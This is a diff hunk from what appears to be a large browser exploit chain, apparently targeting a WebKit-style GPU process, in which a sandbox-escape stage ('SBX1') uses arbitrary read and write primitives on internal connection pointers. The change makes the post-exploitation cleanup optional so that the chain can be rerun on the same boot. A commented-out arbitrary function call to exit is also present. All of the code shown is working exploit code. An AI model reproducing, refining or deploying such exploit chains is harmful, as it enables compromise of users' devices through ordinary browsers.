@@ -8627,14 +8627,21 @@
         sbx1_end = Date.now();
         log(`[profiler] sbx1 took ${sbx1_end - sbx0_pac_end} ms`);
         LOG(`[+] SBX1 complete`);
-        LOG('Invalidate backend connection from gpu process side');
+        const preserveBackendConnectionAfterSuccess =
+          p.repro_preserve_backend_connection_after_success !== false;
         const remoteRenderingBackendMap = gpu_read64(myWebProcessConnection + 0xe8n);
         LOG(`remoteRenderingBackendMap: ${remoteRenderingBackendMap.hex()} `);
         const remoteGraphicsContextGLMap = gpu_read64(myWebProcessConnection + 0xf0n);
         LOG(`remoteGraphicsContextGLMap: ${remoteGraphicsContextGLMap.hex()} `);
-        gpu_write64(myWebProcessConnection + 0xe8n, 0n);
-        gpu_write64(myWebProcessConnection + 0xf0n, 0n);
-        LOG('Invalidated');
+        if (preserveBackendConnectionAfterSuccess) {
+          LOG('[repro] Preserving backend connection for same-boot reruns');
+          LOG('[repro] Skipped backend invalidation after successful chain');
+        } else {
+          LOG('Invalidate backend connection from gpu process side');
+          gpu_write64(myWebProcessConnection + 0xe8n, 0n);
+          gpu_write64(myWebProcessConnection + 0xf0n, 0n);
+          LOG('Invalidated');
+        }
         //LOG("Calling _exit()");
         //fcall(offsets.exit, 0n);
 
